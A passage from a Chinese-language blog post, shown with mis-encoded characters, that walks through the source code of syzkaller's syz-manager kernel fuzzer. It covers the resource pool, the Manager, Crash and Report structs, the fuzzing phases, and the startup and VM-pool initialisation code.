class="hljs-built_in">append</span>(pool.ids, ids...)<br><span class="hljs-comment">// Notify the listener.</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> pool.Freed &lt;- <span class="hljs-literal">true</span>:<br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Len() <span class="hljs-type">int</span> &#123;<br>pool.mu.RLock()<br><span class="hljs-keyword">defer</span> pool.mu.RUnlock()<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(pool.ids)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Take(cnt <span class="hljs-type">int</span>) []<span class="hljs-type">int</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>totalItems := <span class="hljs-built_in">len</span>(pool.ids)<br><span class="hljs-keyword">if</span> totalItems &lt; cnt &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>ret := <span class="hljs-built_in">append</span>([]<span class="hljs-type">int</span>&#123;&#125;, pool.ids[totalItems-cnt:]...)<br>pool.ids = pool.ids[:totalItems-cnt]<br><span class="hljs-keyword">return</span> ret<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> TakeOne() *<span class="hljs-type">int</span> &#123;<br>ret := pool.Take(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> ret == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> &amp;ret[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ—¶æœ‰ä¸€ä¸ª <code>SequentialResourcePool()</code> å‡½æ•°ç”¨ä»¥åˆå§‹åŒ–èµ„æºæ± ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SequentialResourcePool</span><span class="hljs-params">(count <span class="hljs-type">int</span>, delay time.Duration)</span></span> *ResourcePool &#123;<br>ret := &amp;ResourcePool&#123;Freed: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-number">1</span>)&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; count; i++ &#123;<br>ret.Put(i)<br>time.Sleep(delay)<br>&#125;<br>&#125;()<br><span class="hljs-keyword">return</span> ret<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å…¨å±€ç®¡æ§ç›¸å…³"><a href="#å…¨å±€ç®¡æ§ç›¸å…³" class="headerlink" title="å…¨å±€ç®¡æ§ç›¸å…³"></a>å…¨å±€ç®¡æ§ç›¸å…³</h2><h3 id="1-Managerï¼šåŸºæœ¬ä¿¡æ¯"><a href="#1-Managerï¼šåŸºæœ¬ä¿¡æ¯" class="headerlink" title="1. Managerï¼šåŸºæœ¬ä¿¡æ¯"></a>1. Managerï¼šåŸºæœ¬ä¿¡æ¯</h3><p><code>Manager</code> ç»“æ„ä½“ç”¨äº<strong>è¡¨ç¤ºä¸€ä¸ª syz-manager çš„åŸºæœ¬ä¿¡æ¯</strong>ï¼Œå®šä¹‰äº <code>syz-manager/manager.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Manager <span class="hljs-keyword">struct</span> &#123;<br>cfg            *mgrconfig.Config<br>vmPool         *vm.Pool<br>target         *prog.Target<br>sysTarget      *targets.Target<br>reporter       *report.Reporter<br>crashdir       <span class="hljs-type">string</span><br>serv           *RPCServer<br>corpusDB       *db.DB<br>startTime      time.Time<br>firstConnect   time.Time<br>fuzzingTime    time.Duration<br>stats          *Stats<br>crashTypes     <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>vmStop         <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>checkResult    *rpctype.CheckArgs<br>fresh          <span class="hljs-type">bool</span><br>numFuzzing     <span class="hljs-type">uint32</span><br>numReproducing <span class="hljs-type">uint32</span><br><br>dash *dashapi.Dashboard<br><br>mu                    sync.Mutex<br>phase                 <span class="hljs-type">int</span><br>targetEnabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span><br><br>candidates       []rpctype.Candidate <span class="hljs-comment">// untriaged inputs from corpus and hub</span><br>disabledHashes   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpus           <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem<br>seeds            [][]<span class="hljs-type">byte</span><br>newRepros        [][]<span class="hljs-type">byte</span><br>lastMinCorpus    <span class="hljs-type">int</span><br>memoryLeakFrames <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>dataRaceFrames   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>saturatedCalls   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br>needMoreRepros <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>hubReproQueue  <span class="hljs-keyword">chan</span> *Crash<br>reproRequest   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// For checking that files that we are using are not changing under us.</span><br><span class="hljs-comment">// Maps file name to modification time.</span><br>usedFiles <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time<br><br>modules            []host.KernelModule<br>coverFilter        <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-type">uint32</span><br>coverFilterBitmap  []<span class="hljs-type">byte</span><br>modulesInitialized <span class="hljs-type">bool</span><br><br>assetStorage *asset.Storage<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåªè¯´æ˜æ¯”è¾ƒå…³é”®çš„å‡ ä¸ªå­—æ®µï¼š</p><ul><li><code>cfg</code>ï¼šåŸºæœ¬è®¾ç½®ä¿¡æ¯ï¼Œå¯¹åº”å­˜æ”¾åœ¨ä¸€ä¸ª json æ–‡ä»¶ä¸­</li><li><code>vmPool</code> ï¼šæ‰€ç”¨çš„ VM Pool</li><li><code>reporter</code>ï¼šç”¨ä»¥æŠ¥å‘Š crash</li><li><code>serv</code> ï¼šRPC Serverï¼Œç”¨ä»¥ä¸ Guest é—´é€šä¿¡</li><li><code>corpusDB</code>ï¼šå­˜æ”¾è¯­æ–™çš„æ•°æ®åº“</li><li><code>targetEnabledSyscalls</code>ï¼šæµ‹è¯•ç”¨ä¾‹æ‰€å…è®¸ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨</li><li><code>candidates</code>ï¼šå¾…æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹</li><li><code>corpus</code>ï¼šè¯­æ–™åº“</li><li><code>seeds</code>ï¼šç”¨æ¥å¯¹è¯­æ–™åº“å˜å¼‚çš„ç§å­</li></ul><h3 id="2-fuzzing-phase"><a href="#2-fuzzing-phase" class="headerlink" title="2. fuzzing phase"></a>2. fuzzing phase</h3><p><code>syz-manager</code> ä¸­å°† fuzzing æµç¨‹åˆ†ä¸ºå¦‚ä¸‹çš„ä¸åŒé˜¶æ®µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br><span class="hljs-comment">// åˆšåˆšå¼€å§‹ï¼Œå•¥éƒ½æ²¡åš.</span><br>phaseInit = <span class="hljs-literal">iota</span><br><span class="hljs-comment">// åŠ è½½äº†è¯­æ–™åº“ä¸”æ£€æŸ¥äº†æœºå™¨.</span><br>phaseLoadedCorpus<br><span class="hljs-comment">// ä»è¯­æ–™åº“ä¸­åˆ†ç±»äº†æ‰€æœ‰è¾“å…¥.</span><br><span class="hljs-comment">// è¿™æ˜¯æˆ‘ä»¬å¼€å§‹æŸ¥è¯¢ hub ä¸æœ€å°åŒ–è¿ç»­è¯­æ–™åº“çš„æ—¶å€™.</span><br>phaseTriagedCorpus<br><span class="hljs-comment">// ç¬¬ä¸€ä¸ªè¯·æ±‚å‘é€åˆ°äº† hub.</span><br>phaseQueriedHub<br><span class="hljs-comment">// åˆ†ç±»æ‰€æœ‰æ¥è‡ª hub çš„æ–°è¾“å…¥.</span><br><span class="hljs-comment">// è¿™æ˜¯æˆ‘ä»¬å¼€å§‹å¤ç° crashes çš„æ—¶å€™.</span><br>phaseTriagedHub<br>)<br></code></pre></td></tr></table></figure><h2 id="Fuzzing-ç»“æœç›¸å…³"><a href="#Fuzzing-ç»“æœç›¸å…³" class="headerlink" title="Fuzzing ç»“æœç›¸å…³"></a>Fuzzing ç»“æœç›¸å…³</h2><h3 id="1-Crashï¼šè®°å½•-crash-ä¿¡æ¯"><a href="#1-Crashï¼šè®°å½•-crash-ä¿¡æ¯" class="headerlink" title="1. Crashï¼šè®°å½• crash ä¿¡æ¯"></a>1. Crashï¼šè®°å½• crash ä¿¡æ¯</h3><p><code>manager.go</code> ä¸­å®šä¹‰äº†<code>Crash</code> ç»“æ„ä½“ç”¨ä»¥è®°å½•äº§ç”Ÿ crash çš„ VMã€æœºå™¨ä¿¡æ¯ç­‰ï¼Œ<strong>çœŸæ­£çš„ crash ä¿¡æ¯ä¸»è¦å­˜æ”¾åœ¨ä¸€ä¸ª <code>Report</code> ç»“æ„ä½“ä¸­</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Crash <span class="hljs-keyword">struct</span> &#123;<br>vmIndex <span class="hljs-type">int</span><br>hub     <span class="hljs-type">bool</span> <span class="hljs-comment">// this crash was created based on a repro from hub</span><br>*report.Report<br>machineInfo []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š"><a href="#2-Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š" class="headerlink" title="2. Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š"></a>2. Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š</h3><p><code>pkg/report/rteport.go</code> ä¸­çš„ <code>Report</code> ç»“æ„ä½“ç”¨ä»¥è¡¨ç¤ºå•æ¬¡æ‰§è¡Œçš„ç»“æœï¼ŒåŒ…æ‹¬æ˜¯å¦äº§ç”Ÿäº† crashã€Oops çš„ä¿¡æ¯ç­‰ç­‰ï¼š</p><ul><li><p><code>Title</code>ï¼š<strong>Oops çš„ç¬¬ä¸€è¡Œæ–‡æœ¬ï¼Œç”¨æ¥æ ‡è¯†ç‰¹å®šç±»å‹çš„ crash</strong></p><blockquote><p>ä¾‹å¦‚ <code>BUG: unable to handle page fault for address: ffffffff81001619</code> è¿™æ ·çš„</p></blockquote></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Report <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// Title contains a representative description of the first oops.</span><br>Title <span class="hljs-type">string</span><br><span class="hljs-comment">// Alternative titles, used for better deduplication.</span><br><span class="hljs-comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span><br>AltTitles []<span class="hljs-type">string</span><br><span class="hljs-comment">// Bug type (e.g. hang, memory leak, etc).</span><br>Type Type<br><span class="hljs-comment">// The indicative function name.</span><br>Frame <span class="hljs-type">string</span><br><span class="hljs-comment">// Report contains whole oops text.</span><br>Report []<span class="hljs-type">byte</span><br><span class="hljs-comment">// Output contains whole raw console output as passed to Reporter.Parse.</span><br>Output []<span class="hljs-type">byte</span><br><span class="hljs-comment">// StartPos/EndPos denote region of output with oops message(s).</span><br>StartPos <span class="hljs-type">int</span><br>EndPos   <span class="hljs-type">int</span><br><span class="hljs-comment">// SkipPos is position in output where parsing for the next report should start.</span><br>SkipPos <span class="hljs-type">int</span><br><span class="hljs-comment">// Suppressed indicates whether the report should not be reported to user.</span><br>Suppressed <span class="hljs-type">bool</span><br><span class="hljs-comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span><br>Corrupted <span class="hljs-type">bool</span><br><span class="hljs-comment">// CorruptedReason contains reason why the report is marked as corrupted.</span><br>CorruptedReason <span class="hljs-type">string</span><br><span class="hljs-comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span><br>Recipients vcs.Recipients<br><span class="hljs-comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span><br>GuiltyFile <span class="hljs-type">string</span><br><span class="hljs-comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span><br>reportPrefixLen <span class="hljs-type">int</span><br><span class="hljs-comment">// symbolized is set if the report is symbolized.</span><br>symbolized <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-main-ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨-manager"><a href="#0x02-main-ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨-manager" class="headerlink" title="0x02. main()ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨ manager"></a>0x02. main()ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨ manager</h1><p><code>syz-manager</code> çš„ <code>main()</code> å‡½æ•°å…¶å®æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯è½½å…¥é…ç½®æ–‡ä»¶ä¿¡æ¯å¹¶è°ƒç”¨ <code>RunManager()</code> ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> prog.GitRevision == <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)<br>&#125;<br>flag.Parse()<br>log.EnableLogCaching(<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)<br>cfg, err := mgrconfig.LoadFile(*flagConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>RunManager(cfg)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><del>ğŸ‘´å¯»æ€å¥½åƒæ²¡ä»€ä¹ˆå¥½è¯´çš„</del></p></blockquote><h1 id="0x03-RunManager-ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ"><a href="#0x03-RunManager-ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ" class="headerlink" title="0x03. RunManager()ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ"></a>0x03. RunManager()ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ</h1><h3 id="Step-1-åˆå§‹åŒ–-VM-Pool"><a href="#Step-1-åˆå§‹åŒ–-VM-Pool" class="headerlink" title="Step 1. åˆå§‹åŒ– VM Pool"></a>Step 1. åˆå§‹åŒ– VM Pool</h3><p>é¦–å…ˆæ˜¯åˆå§‹åŒ– VM Poolï¼Œè¿™é‡Œè°ƒç”¨äº† <code>vm/vm.go</code> ä¸­çš„ <code>Create()</code> æ¥å®Œæˆ VM pool çš„åˆ›å»º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmPool *vm.Pool<br>   <span class="hljs-comment">// &quot;none&quot; ç±»å‹å¯¹äºè°ƒè¯•/å¼€å‘è€Œè¨€æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œmanager å¹¶ä¸ä¼šå¯åŠ¨ä»»ä½• VMï¼Œ</span><br>   <span class="hljs-comment">// ä½†ç›¸åº”çš„æ˜¯ä½ åº”å½“æ‰‹åŠ¨å¯åŠ¨ VM å¹¶åœ¨æ­¤å¯åŠ¨ syz-fuzzer.</span><br><span class="hljs-keyword">if</span> cfg.Type != <span class="hljs-string">&quot;none&quot;</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>vmPool, err = vm.Create(cfg, *flagDebug)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦å°±æ˜¯è·å– VM ç±»å‹ã€å°è£…ä¸€ä¸ª Env ç»“æ„ä½“ã€è°ƒç”¨å¯¹åº”ç±»å‹ VM Pool çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create åˆ›å»ºä¸€ä¸ªå¯ç”¨äºåˆ›å»ºç‹¬ç«‹ VMs çš„ VM pool.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span class="hljs-params">(cfg *mgrconfig.Config, debug <span class="hljs-type">bool</span>)</span></span> (*Pool, <span class="hljs-type">error</span>) &#123;<br>typ, ok := vmimpl.Types[cfg.Type]<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)<br>&#125;<br>env := &amp;vmimpl.Env&#123;<br>Name:      cfg.Name,<br>OS:        cfg.TargetOS,<br>Arch:      cfg.TargetVMArch,<br>Workdir:   cfg.Workdir,<br>Image:     cfg.Image,<br>SSHKey:    cfg.SSHKey,<br>SSHUser:   cfg.SSHUser,<br>Timeouts:  cfg.Timeouts,<br>Debug:     debug,<br>Config:    cfg.VM,<br>KernelSrc: cfg.KernelSrc,<br>&#125;<br>impl, err := typ.Ctor(env)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;Pool&#123;<br>impl:     impl,<br>workdir:  env.Workdir,<br>template: cfg.WorkdirTemplate,<br>timeouts: cfg.Timeouts,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-åˆå§‹åŒ–-Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨"><a href="#Step-2-åˆå§‹åŒ–-Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨" class="headerlink" title="Step 2. åˆå§‹åŒ– Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨"></a>Step 2. åˆå§‹åŒ– Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨</h3><p>éšåä¼šåˆ›å»ºç”¨äºå­˜å‚¨ crash çš„æ–‡ä»¶å¤¹ä¸ä¸€ä¸ªæ–°çš„ Reporter å®ä¾‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">crashdir := filepath.Join(cfg.Workdir, <span class="hljs-string">&quot;crashes&quot;</span>)<br>osutil.MkdirAll(crashdir)<br><br>reporter, err := report.NewReporter(cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„ Manager å®ä¾‹ï¼Œç„¶åæ˜¯å››æ­¥èµ°ï¼š</p><ul><li><p><code>preloadCorpus()</code>ï¼šæ£€æŸ¥ <code>corpus.db</code> æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼ˆè‹¥ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼‰å¹¶è½½å…¥ <code>sys/è¦fuzzçš„OS/test</code> ç›®å½•ä¸‹çš„æµ‹è¯•ç”¨æ¨¡æ¿</p><blockquote><p>è¯­æ–™åº“è½½å…¥çš„æ¨¡æ¿æœ¬èº«ç±»ä¼¼äº syzlang æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>sys/linux/pipe</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">pipe2(&amp;(0x7f0000000000)=&#123;&lt;r0=&gt;0x0, &lt;r1=&gt;0x0&#125;, 0x0)<br>close(r0)<br>close(r1)<br></code></pre></td></tr></table></figure></blockquote></li><li><p><code>initStats()</code>ï¼šæ³¨å†Œä¸€ä¸ª prometheus ç›‘è§†å™¨ï¼ˆä¸€ä¸ªå¼€æºçš„ç›‘è§†&amp;é¢„è­¦å·¥å…·åŒ…ï¼‰</p></li><li><p><code>initHTTP()</code>ï¼šåˆ›å»ºä¸€ä¸ª HTTP æœåŠ¡å™¨å¹¶æ³¨å†Œä¸€ç³»åˆ—çš„ç›®å½•ï¼ˆç”¨ä»¥ä¾›ä½¿ç”¨è€…è®¿é—®ï¼‰</p></li><li><p><code>collectUsedFiles()</code>ï¼šæ£€æŸ¥æ‰€éœ€æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go">mgr := &amp;Manager&#123;<br>cfg:              cfg,<br>vmPool:           vmPool,<br>target:           cfg.Target,<br>sysTarget:        cfg.SysTarget,<br>reporter:         reporter,<br>crashdir:         crashdir,<br>startTime:        time.Now(),<br>stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="hljs-string">&quot;&quot;</span>&#125;,<br>crashTypes:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>corpus:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem),<br>disabledHashes:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>memoryLeakFrames: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>dataRaceFrames:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>fresh:            <span class="hljs-literal">true</span>,<br>vmStop:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>hubReproQueue:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Crash, <span class="hljs-number">10</span>),<br>needMoreRepros:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>reproRequest:     <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>usedFiles:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time),<br>saturatedCalls:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>&#125;<br><br>mgr.preloadCorpus()<br>mgr.initStats() <span class="hljs-comment">// åˆå§‹åŒ– prometheus å˜é‡.</span><br>mgr.initHTTP()  <span class="hljs-comment">// åˆ›å»º HTTP æœåŠ¡.</span><br>mgr.collectUsedFiles()<br></code></pre></td></tr></table></figure><p>ä¹‹ååˆ›å»ºä¸€ä¸ª RPC Serverï¼Œç”¨ä»¥åœ¨ Host ä¸ Guest VMs ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 